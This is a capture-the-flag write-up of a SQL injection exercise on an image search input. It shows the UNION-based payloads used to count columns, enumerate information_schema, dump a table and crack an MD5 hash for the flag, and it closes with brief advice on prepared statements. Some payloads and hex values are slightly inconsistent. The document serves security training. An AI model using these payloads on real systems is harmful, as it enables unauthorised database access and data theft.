SQL Injection - Images

1. Is the input vulnerable ?
	We can see that the input is vulnerable to SQL injection by submitting:
		Query: 1 or 1=1

2. What kind of query is done ?
	We can deduce that the query must look something like:
		SELECT `title`, `url` from `table name` where ID = [USER INPUT]

3. Exploitation method ?
	Knowing what the query looks like, we can assume it may be vulnerable to a UNION attack.
	We can confirm it by submitting:
		Query: 1 and 1=2 or union select test

4. Column number ?
	We can get how many columns is required for the injection by testing:
		Query: 1 and 1=2 or union select null
			=> "The used SELECT statements have a different number of columns"
		Query: 1 and 1=2 or union select null, null
			=> We get a result so the number of required columns is 2

5. Table schema (Databases) + Table name
	We are on MySQL, so we can use the metadata in the information_schema to get the table schema and table names:
		Query: 1 and 1=2 union select table_schema, table_name from information_schema.tables
			=> We find interesting tables:
				Member_Brute_Force.db_default
				Member_Sql_Injection.users
				Member_guestbook.guestbook
				Member_images.list_images
				Memver_survey.vote_dbs

6. Column names
		list_images in hex is 0x6c6973745f696d61676573
		etc
		Query = 1 and 1=2 union select table_name, column_name from information_schema.columns where table_name=0x7573657273
			=> We get all the columns

7. Tables extraction:
	list_images:
		Query: 1 and 1=2 union select NULL, concat(id, url, title, comment) from Member_images.list_images
			=> "If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46"
				Decrypt => lower => sha256
				1928e8083cf461a51303633093573c46 (crackstation => MD5) = albatroz => we hash it with sha256 and we get the flag


PROTECTION
	Sanitize properly user input from the back. Tons of lib can do this whatever language is used.
	Prepared statements with parametrized queries is is considered to be top 1 protection. This allows to distinguish between code and input so something like "1 and 1=2 etc." would be looked at directly in the database as the ID input.
